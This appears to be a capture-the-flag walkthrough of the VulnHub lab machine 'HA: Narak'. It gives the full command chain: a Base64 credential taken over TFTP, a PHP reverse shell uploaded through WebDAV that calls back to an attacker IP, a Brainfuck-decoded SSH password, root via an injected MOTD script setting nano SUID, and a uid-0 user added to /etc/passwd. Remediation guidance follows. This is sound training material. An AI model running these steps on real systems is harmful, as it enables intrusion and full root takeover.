# HA: Narak — Descend Into the Hindu Underworld, Then Claw Your Way Back Out

In Hindu mythology, Narak is the realm of punishment where souls are sent to atone for their sins. This machine is the digital equivalent: every service hides a trap, every credential is encoded, and the final escalation hides in plain sight inside the login banner itself. TFTP leaks a Base64 credential, WebDAV lets you walk right in, a Brainfuck-encoded script guards lateral movement, and a MOTD script running as root hands you the keys at the end. Diabolically layered. Legit. gg

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Narak |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-narak,569/ |
| **Techniques** | UDP service enumeration, TFTP credential retrieval, Base64 decode, WebDAV PHP shell upload via cadaver, Brainfuck decode, SSH lateral movement, MOTD script injection, nano SUID, /etc/passwd edit |
| **CVEs** | CWE-284 (Improper Access Control: WebDAV unrestricted PUT), CWE-522 (Insufficiently Protected Credentials: TFTP plaintext), CWE-269 (Improper Privilege Management: SUID editor) |
| **APT Groups** | APT41: exploits misconfigured WebDAV and file upload vectors for initial access in enterprise and government targets; Lazarus Group: abuses credential exposure in auxiliary protocols (TFTP, FTP) as staging for lateral movement |

---

## Attack Summary

```
nmap TCP → HTTP (80), SSH (22)
  → dirb → /webdav (HTTP auth required) + tips.txt + /igolder/
  → tips.txt → "look for creds.txt"
  → nmap -sU -p 69 → TFTP open
  → tftp get creds.txt → base64 decode → yamdoot:Swarg
  → cadaver http://target/webdav → PUT shell.php → www-data shell
  → find writable files → /mnt/hell.sh (Brainfuck encoded)
  → decode Brainfuck → chitragupt
  → ssh inferno@target (chitragupt) → user flag
  → /etc/update-motd.d/00-header writable → append nano SUID grant
  → ssh reconnect → MOTD triggers → nano SUID set
  → nano /etc/passwd → add root-level user jeenali
  → su jeenali → uid=0(root) → /root/root.txt
```

---

## Methodology

1. Host discovery and full TCP port scan
2. Web enumeration: dirb for directories and files
3. UDP scan to discover TFTP on port 69
4. TFTP credential retrieval and Base64 decode
5. WebDAV authenticated PHP shell upload via cadaver
6. Post-exploitation: locate and decode Brainfuck-encoded script
7. SSH lateral movement to user `inferno`
8. MOTD script injection to set nano SUID
9. nano SUID privilege escalation via /etc/passwd edit

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.0.0/24
# Target: 192.168.0.136

nmap -sV -sC -p- 192.168.0.136
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd
```

Only SSH and HTTP on TCP. Always run a UDP scan too, especially for boot2root boxes that hide TFTP.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
dirb http://192.168.0.136/
dirb http://192.168.0.136/ -X .txt
```

Key finds:
- `/webdav` — returns HTTP 401 (auth required)
- `tips.txt` — content: "look for creds.txt via another protocol"
- `/igolder/` — golden key reference (thematic)

```bash
curl http://192.168.0.136/tips.txt
```

The tips file points directly to TFTP. Neat. No cap.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — UDP Scan and TFTP Credential Retrieval

TCP scans never catch TFTP. Run a targeted UDP scan:

```bash
nmap -sU -p 69 192.168.0.136
# 69/udp open  tftp
```

Retrieve `creds.txt` over TFTP (no authentication required by default):

```bash
tftp 192.168.0.136
tftp> get creds.txt
tftp> quit
cat creds.txt
# eWFtZG9vdDpTd2FyZw==

echo "eWFtZG9vdDpTd2FyZw==" | base64 -d
# yamdoot:Swarg
```

Credential in Base64 over unauthenticated TFTP. Wild.

**Real-world note:** TFTP (Trivial File Transfer Protocol) has zero authentication. It is still found in production environments for PXE boot, network device firmware, and VoIP phone provisioning. Organizations routinely forget it is exposed and leave credentials or configuration files accessible anonymously.

**MITRE ATT&CK:** T1078.001 — Valid Accounts: Default Accounts; T1552 — Unsecured Credentials

---

## Step 4 — WebDAV PHP Shell Upload via cadaver

Use the recovered credential to upload a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit: $ip = '<ATTACKER_IP>'; $port = 4444;

cadaver http://192.168.0.136/webdav
dav:/webdav/> open http://192.168.0.136/webdav
# Username: yamdoot
# Password: Swarg
dav:/webdav/> put /tmp/shell.php
dav:/webdav/> quit
```

Start listener, then trigger:

```bash
nc -lvnp 4444 &
curl http://192.168.0.136/webdav/shell.php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Shell as `www-data`. In.

**Real-world note:** WebDAV (Web Distributed Authoring and Versioning) is a protocol extension to HTTP that allows clients to create, modify, and delete files on web servers. Many organizations enable it for SharePoint, SVN, or legacy CMS systems and forget to restrict PUT operations properly.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

Fully interactive shell now.

**MITRE ATT&CK:** T1059.004 — Unix Shell

---

## Step 6 — Brainfuck Decode: Finding the Lateral Credential

Look for writable or interesting files:

```bash
find / -type f -perm -ug=rwx 2>/dev/null
cat /mnt/hell.sh
```

The script is encoded in Brainfuck. Copy the content and decode it using any Brainfuck interpreter:

```bash
# Online: https://www.dcode.fr/brainfuck-language
# Or install: apt install beef
# Decoded output: chitragupt
```

Chitragupt is the divine record-keeper of Narak in Hindu mythology — the one who keeps the registry of deeds. Thematic. No cap.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1552.001 — Credentials in Files

---

## Step 7 — SSH Lateral Movement to `inferno`

```bash
ssh inferno@192.168.0.136
# Password: chitragupt

cat /home/inferno/user.txt
```

User flag obtained.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 8 — MOTD Injection: Setting nano SUID

The MOTD (Message of the Day) scripts in `/etc/update-motd.d/` run as root every time a user logs in via SSH. If these files are writable by the current user, this is trivial root.

```bash
ls -la /etc/update-motd.d/
# 00-header is writable by inferno
cat /etc/update-motd.d/00-header

echo "sudo chmod u+s /bin/nano" >> /etc/update-motd.d/00-header
```

Reconnect via SSH to trigger the MOTD as root:

```bash
ssh inferno@192.168.0.136
ls -la /bin/nano
# -rwsr-xr-x  (SUID now set)
```

**Real-world note:** MOTD scripts running as root with world-writable permissions appear in multiple breach reports. OceanLotus (APT32) specifically enumerates MOTD and cron scripts after initial access on Linux systems as a persistence and privilege escalation vector.

**MITRE ATT&CK:** T1037.004 — Boot or Logon Initialization Scripts: RC Scripts (analogous MOTD vector); T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 9 — nano SUID: /etc/passwd Edit to Root

Generate a password hash and add a new root-level user:

```bash
openssl passwd -1 -salt user3 pass123
# $1$user3$rAGRVf5p2jYTqtqOW5cPu/

nano /etc/passwd
# Append this line:
# jeenali:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash
```

Switch to the new user:

```bash
su jeenali
# Password: pass123
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. Narak conquered.

**MITRE ATT&CK:** T1548.001 — Setuid/Setgid abuse; T1136.001 — Create Account: Local Account

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | yamdoot:Swarg | TFTP creds.txt (Base64) | WebDAV cadaver login |
| Brainfuck secret | chitragupt | /mnt/hell.sh | SSH password for inferno |
| User flag | /home/inferno/user.txt | Post-SSH login | Captured |
| Root flag | /root/root.txt | MOTD injection + nano SUID + /etc/passwd | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | TFTP open with credentials accessible anonymously | TFTP is still active in thousands of production environments for PXE and VoIP provisioning | Disable TFTP if not needed; restrict to specific IPs; never store credentials in TFTP-accessible files |
| 2 | WebDAV PUT allowed with weak credentials | WebDAV with PUT enabled is effectively a remote file write; found in SharePoint, SVN, and legacy CMS setups | Disable WebDAV PUT or restrict to trusted sources; enforce strong auth |
| 3 | MOTD scripts writable by non-root user | MOTD injection is a stealthy persistence/privesc vector that survives reboots | Set /etc/update-motd.d/ ownership to root:root 755; audit all root-executed scripts |
| 4 | Brainfuck-encoded password in writable script | Encoding is not encryption; any encoded credential is recoverable | Use a secrets manager; never store credentials in scripts, encoded or not |
| 5 | nano SUID allows /etc/passwd modification | Any SUID text editor grants trivial root by editing passwd or sudoers | Audit all SUID binaries regularly; never set SUID on editors or interpreters |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Unsecured Credentials | T1552 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application (WebDAV) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information (Brainfuck) | T1027 |
| Privilege Escalation | Privilege Escalation | Boot or Logon Init Scripts: MOTD | T1037.004 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid | T1548.001 |
| Persistence | Persistence | Create Account: Local Account | T1136.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable or restrict TFTP** — `systemctl stop tftpd; systemctl disable tftpd`; if required, restrict via `/etc/hosts.allow` to specific management IPs only
2. **Disable WebDAV PUT** — in Apache: remove `dav_module`; or restrict PUT via `<LimitExcept GET POST>`
3. **Fix MOTD script permissions** — `chown root:root /etc/update-motd.d/*; chmod 755 /etc/update-motd.d/*`
4. **Remove SUID from editors** — `chmod u-s /bin/nano /usr/bin/vim`; audit regularly: `find / -perm -4000 -type f 2>/dev/null`
5. **Rotate exposed credentials** — yamdoot:Swarg and chitragupt must be invalidated immediately

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable WebDAV PUT; restrict TFTP)
- **D3-OAM** — Operating System Administrative Management (SUID audit; MOTD permissions)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in scripts or config files)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all UDP services; audit MOTD scripts and SUID binaries |
| Protect | Access Control | Disable TFTP or restrict to trusted IPs; remove WebDAV PUT permissions |
| Protect | Data Security | Remove credentials from TFTP-accessible files and encoded scripts |
| Detect | Anomalies and Events | Alert on WebDAV PUT requests; monitor SSH login patterns |
| Respond | Response Planning | Rotate all exposed credentials; remove uploaded webshells |
| Recover | Recovery Planning | Audit /etc/passwd and sudoers for unauthorized modifications |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | WebDAV PUT restrictions; TFTP access controls |
| AC-6 | Least Privilege | Remove SUID from editors; restrict MOTD write access |
| IA-5 | Authenticator Management | Rotate TFTP-exposed credentials; enforce strong WebDAV passwords |
| CM-6 | Configuration Settings | Audit MOTD scripts; disable unnecessary protocols (TFTP) |
| CM-7 | Least Functionality | Disable WebDAV if not required; remove SUID from non-essential binaries |
| SC-28 | Protection of Information at Rest | No credentials in scripts, encoded or plaintext |

### CISA KEV

Unrestricted WebDAV file upload (CWE-284) maps to patterns documented in CISA Alerts AA21-008A and AA22-074A covering web application file upload exploitation for initial access. MOTD script injection as a privilege escalation vector is documented in CISA guidance on Linux post-exploitation techniques.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

HA: Narak earns its name. Each layer of the underworld is a different vulnerability class: a forgotten UDP service, an unauthenticated protocol, an obfuscated credential, a writable system script. The machine teaches that comprehensive enumeration means going beyond TCP, and that privilege escalation vectors are hiding in the most mundane places: a login banner that runs as root.

The Brainfuck decode is a chef's kiss. Any CTF player who has stared at that syntax for the first time and thought "this cannot be a real thing" has had the Narak experience.

Thanks guys!! (❍ᴥ❍ʋ)
